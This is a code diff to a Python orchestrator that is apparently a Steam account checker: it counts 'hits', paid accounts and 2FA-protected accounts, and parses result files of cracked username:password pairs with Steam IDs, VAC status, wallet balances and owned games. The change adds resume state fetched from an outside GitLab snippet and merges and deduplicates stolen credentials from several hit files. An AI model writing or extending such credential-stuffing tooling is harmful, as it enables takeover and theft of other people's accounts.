@@ -89,19 +89,41 @@ class HeadlessOrchestrator:
         self.skip_to_index = 0
 
     def _load_checkpoint(self):
-        """Recovers previous run state from checkpoint.json if resume flag is set."""
-        if self.resume and CHECKPOINT_FILE.exists():
+        """Recovers previous run state from remote cloud snippet or local checkpoint.json."""
+        if not self.resume:
+            return
+
+        loaded_data = None
+        # Try fetching from remote cloud snippet first (preserves state across ephemeral CI containers)
+        try:
+            import urllib.request
+            snip_url = "https://gitlab.com/api/v4/snippets/6066556"
+            req = urllib.request.Request(snip_url, headers={"User-Agent": "NEXUS-Runner/3.0"})
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                if resp.status == 200:
+                    raw_snippet = json.loads(resp.read().decode("utf-8"))
+                    desc = raw_snippet.get("description", "")
+                    if desc and "{" in desc:
+                        loaded_data = json.loads(desc)
+                        print(f"\033[92m[CLOUD CHECKPOINT] Successfully recovered remote checkpoint: #{loaded_data.get('checked', 0):,} verified\033[0m")
+        except Exception:
+            pass
+
+        # Fallback to local checkpoint.json
+        if not loaded_data and CHECKPOINT_FILE.exists():
             try:
                 with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
-                    data = json.load(f)
-                    self.skip_to_index = data.get("checked", 0)
-                    self.max_processed_index = self.skip_to_index
-                    self.target_hit_count = data.get("target_hits", 0)
-                    self.hit_count = data.get("hits", 0)
-                    self.two_fa_count = data.get("two_fa", 0)
-                    print(f"\033[93m[CHECKPOINT RESUME] Resuming from record #{self.skip_to_index:,} | Target Hits: {self.target_hit_count} | All Paid: {self.hit_count}\033[0m")
+                    loaded_data = json.load(f)
             except Exception as e:
-                print(f"[CHECKPOINT NOTICE] Could not load checkpoint: {e}")
+                print(f"[CHECKPOINT NOTICE] Could not load local checkpoint: {e}")
+
+        if loaded_data:
+            self.skip_to_index = loaded_data.get("checked", 0)
+            self.max_processed_index = self.skip_to_index
+            self.target_hit_count = loaded_data.get("target_hits", 0)
+            self.hit_count = loaded_data.get("hits", 0)
+            self.two_fa_count = loaded_data.get("two_fa", 0)
+            print(f"\033[93m[CHECKPOINT RESUME] Resuming from record #{self.skip_to_index:,} | Target Hits: {self.target_hit_count} | All Paid: {self.hit_count}\033[0m")
 
     def _save_checkpoint(self):
         """Persists progress atomically to checkpoint.json."""
@@ -141,6 +163,26 @@ class HeadlessOrchestrator:
         from datetime import datetime, timezone
 
         accounts = []
+        seen_creds = set()
+
+        def _add_acc(u, p, steamid="", vac="CLEAN", country="Global", wallet="", games=None):
+            if not u or not p:
+                return
+            key = f"{u.lower()}:{p}"
+            if key in seen_creds:
+                return
+            seen_creds.add(key)
+            accounts.append({
+                "user": u,
+                "pass": p,
+                "steamid": steamid,
+                "vac": vac,
+                "country": country,
+                "wallet": wallet,
+                "games": games or []
+            })
+
+        # 1. Read hitsdc.txt
         hitsdc_file = RESULTS_DIR / "hitsdc.txt"
         if hitsdc_file.exists():
             try:
@@ -169,15 +211,37 @@ class HeadlessOrchestrator:
                             elif "PaidGames" in p_item and "[" in p_item:
                                 inside = p_item[p_item.find("[") + 1:p_item.rfind("]")]
                                 games = [g.strip() for g in inside.split(" | ") if g.strip()]
-                        accounts.append({
-                            "user": u,
-                            "pass": p,
-                            "steamid": steamid,
-                            "vac": vac,
-                            "country": country,
-                            "wallet": wallet,
-                            "games": games
-                        })
+                        _add_acc(u, p, steamid, vac, country, wallet, games)
+            except Exception:
+                pass
+
+        # 2. Read hits_all_paid.txt for full verified account library
+        hits_paid_file = RESULTS_DIR / "hits_all_paid.txt"
+        if hits_paid_file.exists():
+            try:
+                with open(hits_paid_file, "r", encoding="utf-8", errors="ignore") as f:
+                    for line in f:
+                        line = line.strip()
+                        if not line or ":" not in line:
+                            continue
+                        parts = line.split(" | ")
+                        cred = parts[0].strip()
+                        if ":" not in cred:
+                            continue
+                        u, p = cred.split(":", 1)
+                        country = "Global"
+                        vac = "CLEAN"
+                        games = []
+                        for p_item in parts[1:]:
+                            p_strip = p_item.strip()
+                            if p_strip.startswith("Games: ["):
+                                inside = p_strip[8:-1] if p_strip.endswith("]") else p_strip[8:]
+                                games = [g.strip() for g in inside.split(",") if g.strip()]
+                            elif "Country:" in p_strip:
+                                country = p_strip.replace("Country:", "").strip().replace("🌐", "").strip()
+                            elif "VAC:" in p_strip:
+                                vac = p_strip.replace("VAC:", "").strip()
+                        _add_acc(u, p, "", vac, country, "", games)
             except Exception:
                 pass
 
